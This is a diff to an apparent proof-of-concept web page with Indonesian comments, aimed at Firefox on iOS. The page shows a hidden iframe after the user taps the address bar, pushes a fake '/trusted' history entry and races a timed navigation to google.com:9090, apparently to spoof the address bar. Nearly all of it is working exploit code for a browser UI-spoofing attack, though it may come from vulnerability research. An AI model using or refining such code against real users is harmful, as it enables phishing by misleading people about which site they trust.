@@ -16,7 +16,7 @@ iframe {
   border: 1px solid #ddd;
   border-radius: 12px;
   margin-top: 16px;
-  display: none;
+  display: none; /* awalnya disembunyikan */
 }
 .notice {
   margin-top: 14px;
@@ -35,44 +35,31 @@ iframe {
 </iframe>
 
 <div class="notice">
-  Firefox iOS only — tap omnibar to trigger iframe → google
+  Firefox iOS only — tap omnibar to trigger iframe
 </div>
 
 <script>
 const iframe = document.getElementById('childFrame');
-let triggered = false;
-let lastHeight = window.innerHeight;
 
-// history manipulation (UI trust setup)
+/* deteksi focus kembali setelah user tap omnibar */
+window.addEventListener('focus', () => {
+  if (!iframe.style.display || iframe.style.display === 'none') {
+    iframe.style.display = 'block'; // baru tampil
+  }
+});
+
+/* optional: pushState untuk origin race */
 history.pushState({}, '', '/trusted');
 
-function omnibarLikely() {
-  if (triggered) return;
-
-  // omnibar tap biasanya bikin viewport height berubah
-  if (window.innerHeight < lastHeight) {
-    triggered = true;
-
-    // step 1: tampilkan iframe
-    iframe.style.display = 'block';
-
-    // step 2: navigation race
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
     requestAnimationFrame(() => {
-      requestAnimationFrame(() => {
-        setTimeout(() => {
-          location.href = 'https://google.com:9090';
-        }, 60);
-      });
+      setTimeout(() => {
+        location.href = 'https://google.com:9090';
+      }, 80);
     });
-  }
-
-  lastHeight = window.innerHeight;
-}
-
-// gabungan event biar konsisten
-window.addEventListener('resize', omnibarLikely);
-window.addEventListener('focus', omnibarLikely);
-window.addEventListener('scroll', omnibarLikely);
+  });
+});
 </script>
 
 </body>
